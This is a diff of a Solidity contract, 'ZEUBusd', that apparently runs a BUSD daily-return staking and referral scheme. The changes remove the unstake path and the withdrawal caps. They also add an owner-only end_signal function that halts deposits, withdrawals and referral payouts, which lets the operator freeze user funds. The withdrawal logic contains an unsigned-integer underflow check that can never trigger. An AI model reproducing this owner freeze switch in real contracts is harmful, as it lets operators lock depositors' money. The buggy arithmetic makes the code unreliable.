@@ -1,8 +1,5 @@
-/**
- *Submitted for verification at BscScan.com on 2022-06-20
- */
-
 // SPDX-License-Identifier: UNLICENSED
+
 pragma solidity 0.8.14;
 
 interface IERC20 {
@@ -342,7 +339,6 @@ contract ZEUBusd is Context, Ownable, ReentrancyGuard {
     using SafeMath for uint256;
     uint256 public constant min = 10 ether;
     uint256 public constant max = 10000 ether;
-    // uint256 public roi = 30;
     uint256 public constant deposit_fee = 6;
     uint256 public constant withdraw_fee = 2;
     uint256 public constant ref_fee = 10;
@@ -356,6 +352,7 @@ contract ZEUBusd is Context, Ownable, ReentrancyGuard {
 
     constructor() {
         tokenAdress = 0x4614668d17d0FFD422d3edeD7Dd2E8A759Aa4011;
+        // tokenAdress = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
         BusdInterface = IERC20(tokenAdress);
     }
 
@@ -374,39 +371,22 @@ contract ZEUBusd is Context, Ownable, ReentrancyGuard {
         uint256 invested;
     }
 
-    struct weeklyWithdraw {
-        address user_address;
-        uint256 startTime;
-        uint256 deadline;
-    }
-
     struct claimDaily {
         address user_address;
         uint256 startTime;
         uint256 deadline;
     }
 
-    struct userWithdrawal {
-        address user_address;
-        uint256 amount;
-    }
-
     struct userTotalWithdraw {
         address user_address;
         uint256 amount;
     }
-    struct userTotalRewards {
-        address user_address;
-        uint256 amount;
-    }
+
     mapping(address => uint256) public roi;
     mapping(address => referral_system) public referral;
     mapping(address => user_investment_details) public investments;
-    mapping(address => weeklyWithdraw) public weekly;
     mapping(address => claimDaily) public claimTime;
-    mapping(address => userWithdrawal) public approvedWithdrawal;
     mapping(address => userTotalWithdraw) public totalWithdraw;
-    mapping(address => userTotalRewards) public totalRewards;
     mapping(address => referral_withdraw) public refTotalWithdraw;
 
     function compound() public noReentrant {
@@ -438,7 +418,6 @@ contract ZEUBusd is Context, Ownable, ReentrancyGuard {
         );
     }
 
-    // invest function
     function deposit(address _ref, uint256 _amount) public noReentrant {
         require(init, "Not Started Yet");
         require(_amount >= min && _amount <= max, "Cannot Deposit");
@@ -465,7 +444,6 @@ contract ZEUBusd is Context, Ownable, ReentrancyGuard {
                 );
             }
 
-            // investment details
             uint256 userLastInvestment = investments[msg.sender].invested;
             uint256 userCurrentInvestment = _amount;
             uint256 totalInvestment = SafeMath.add(
@@ -477,17 +455,6 @@ contract ZEUBusd is Context, Ownable, ReentrancyGuard {
                 totalInvestment
             );
 
-            // weekly withdraw
-            // uint256 weeklyStart = block.timestamp;
-            // uint256 deadline_weekly = block.timestamp + 7 days;
-
-            // weekly[msg.sender] = weeklyWithdraw(
-            //     msg.sender,
-            //     weeklyStart,
-            //     deadline_weekly
-            // );
-
-            // Claim Setting
             uint256 claimTimeStart = block.timestamp;
             uint256 claimTimeEnd = block.timestamp + 1 days;
 
@@ -497,7 +464,6 @@ contract ZEUBusd is Context, Ownable, ReentrancyGuard {
                 claimTimeEnd
             );
 
-            // fees
             uint256 total_fee = depositFee(_amount);
             uint256 total_contract = SafeMath.sub(_amount, total_fee);
             BusdInterface.transferFrom(msg.sender, deposit_addr, total_fee);
@@ -528,7 +494,6 @@ contract ZEUBusd is Context, Ownable, ReentrancyGuard {
                 );
             }
 
-            // investment details
             uint256 userLastInvestment = investments[msg.sender].invested;
             uint256 userCurrentInvestment = _amount;
             uint256 totalInvestment = SafeMath.add(
@@ -540,19 +505,6 @@ contract ZEUBusd is Context, Ownable, ReentrancyGuard {
                 totalInvestment
             );
 
-            // weekly withdraw
-            // uint256 weeklyStart = block.timestamp;
-            // uint256 deadline_weekly = block.timestamp + 7 days;
-
-            // weekly[msg.sender] = weeklyWithdraw(msg.sender,weeklyStart,deadline_weekly);
-
-            // Claim Setting
-            //uint256 claimTimeStart = block.timestamp;
-            // uint256 claimTimeEnd = block.timestamp + 1 days;
-
-            // claimTime[msg.sender] = claimDaily(msg.sender,claimTimeStart,claimTimeEnd);
-
-            // fees
             uint256 total_fee = depositFee(_amount);
             uint256 total_contract = SafeMath.sub(_amount, total_fee);
             BusdInterface.transferFrom(msg.sender, deposit_addr, total_fee);
@@ -568,12 +520,9 @@ contract ZEUBusd is Context, Ownable, ReentrancyGuard {
         uint256 userInvestment = investments[_userAddress].invested;
         uint256 userDailyReturn = getDailyRoi(userInvestment, _userAddress);
 
-        // invested time
-
         uint256 claimInvestTime = claimTime[_userAddress].startTime;
-        // uint256 claimInvestEnd = claimTime[_userAddress].deadline;
+
         uint256 nowTime = block.timestamp;
-        // uint256 totalTime = SafeMath.sub(claimInvestEnd, claimInvestTime);
 
         uint256 value = SafeMath.div(userDailyReturn, 1 days);
 
@@ -594,25 +543,8 @@ contract ZEUBusd is Context, Ownable, ReentrancyGuard {
 
     function withdrawal() public noReentrant {
         require(init, "Not Started Yet");
-        // require(
-        //     weekly[msg.sender].deadline <= block.timestamp,
-        //     "You cant withdraw"
-        // );
-        // require(
-        //     totalRewards[msg.sender].amount <=
-        //         SafeMath.mul(investments[msg.sender].invested, 5),
-        //     "You cant withdraw you have collected five times Already"
-        // ); // hh new
+
         uint256 rewards = userReward(msg.sender);
-
-        // uint256 currentApproved = approvedWithdrawal[msg.sender].amount;
-
-        // uint256 value = SafeMath.add(rewards, currentApproved);
-
-        // approvedWithdrawal[msg.sender] = userWithdrawal(msg.sender, value);
-        // uint256 amount = totalRewards[msg.sender].amount; //hhnew
-        // uint256 totalRewardAmount = SafeMath.add(amount, rewards); //hhnew
-        // totalRewards[msg.sender].amount = totalRewardAmount;
 
         uint256 claimTimeStart = block.timestamp;
         uint256 claimTimeEnd = block.timestamp + 1 days;
@@ -625,86 +557,14 @@ contract ZEUBusd is Context, Ownable, ReentrancyGuard {
 
         roi[msg.sender] = SafeMath.sub(roi[msg.sender], 2);
         if (roi[msg.sender] < 0) roi[msg.sender] = 0;
-        // uint256 aval_withdraw = approvedWithdrawal[msg.sender].amount;
-        // uint256 aval_withdraw2 = SafeMath.div(aval_withdraw, 2); // divide the fees
-        // uint256 wFee = withdrawFee(aval_withdraw2); // changed from aval_withdraw
         uint256 wFee = withdrawFee(rewards);
-        // uint256 totalAmountToWithdraw = SafeMath.sub(aval_withdraw2, wFee);
         uint256 totalAmountToWithdraw = SafeMath.sub(rewards, wFee);
         BusdInterface.transfer(msg.sender, totalAmountToWithdraw);
         BusdInterface.transfer(withdraw_addr, wFee);
-        // approvedWithdrawal[msg.sender] = userWithdrawal(
-        //     msg.sender,
-        //     aval_withdraw2
-        // );
-
-        // uint256 weeklyStart = block.timestamp;
-        // uint256 deadline_weekly = block.timestamp + 7 days;
-
-        // weekly[msg.sender] = weeklyWithdraw(
-        //     msg.sender,
-        //     weeklyStart,
-        //     deadline_weekly
-        // );
-
         uint256 amount = totalWithdraw[msg.sender].amount;
-
-        uint256 totalAmount = SafeMath.add(amount, totalAmountToWithdraw); // it will add one of his half to total withdraw
+        uint256 totalAmount = SafeMath.add(amount, totalAmountToWithdraw);
         totalWithdraw[msg.sender] = userTotalWithdraw(msg.sender, totalAmount);
     }
-
-    // function claimDailyRewards() public noReentrant {
-    //     require(init, "Not Started Yet");
-    //     require(
-    //         claimTime[msg.sender].deadline <= block.timestamp,
-    //         "You cant claim"
-    //     );
-
-    //     uint256 rewards = userReward(msg.sender);
-
-    //     uint256 currentApproved = approvedWithdrawal[msg.sender].amount;
-
-    //     uint256 value = SafeMath.add(rewards, currentApproved);
-
-    //     approvedWithdrawal[msg.sender] = userWithdrawal(msg.sender, value);
-    //     uint256 amount = totalRewards[msg.sender].amount; //hhnew
-    //     uint256 totalRewardAmount = SafeMath.add(amount, rewards); //hhnew
-    //     totalRewards[msg.sender].amount = totalRewardAmount;
-
-    //     uint256 claimTimeStart = block.timestamp;
-    //     uint256 claimTimeEnd = block.timestamp + 1 days;
-
-    //     claimTime[msg.sender] = claimDaily(
-    //         msg.sender,
-    //         claimTimeStart,
-    //         claimTimeEnd
-    //     );
-    // }
-
-    // function unStake() external noReentrant {
-    //     require(init, "Not Started Yet");
-    //     uint256 I_investment = investments[msg.sender].invested;
-    //     uint256 t_withdraw = totalWithdraw[msg.sender].amount;
-
-    //     require(
-    //         I_investment > t_withdraw,
-    //         "You already withdraw a lot than your investment"
-    //     );
-    //     uint256 lastFee = depositFee(I_investment);
-    //     uint256 currentBalance = SafeMath.sub(I_investment, lastFee);
-
-    //     uint256 UnstakeValue = SafeMath.sub(currentBalance, t_withdraw);
-
-    //     uint256 UnstakeValueCore = SafeMath.div(UnstakeValue, 2);
-
-    //     BusdInterface.transfer(msg.sender, UnstakeValueCore);
-
-    //     BusdInterface.transfer(withdraw_addr, UnstakeValueCore);
-
-    //     investments[msg.sender] = user_investment_details(msg.sender, 0);
-
-    //     approvedWithdrawal[msg.sender] = userWithdrawal(msg.sender, 0);
-    // }
 
     function Ref_Withdraw() external noReentrant {
         require(init, "Not Started Yet");
@@ -723,13 +583,13 @@ contract ZEUBusd is Context, Ownable, ReentrancyGuard {
         );
     }
 
-    // initialized the market
-
-    function signal_market() public onlyOwner {
+    function start_signal() public onlyOwner {
         init = true;
     }
 
-    // other functions
+    function end_signal() public onlyOwner {
+        init = false;
+    }
 
     function getDailyRoi(uint256 _amount, address _user)
         public
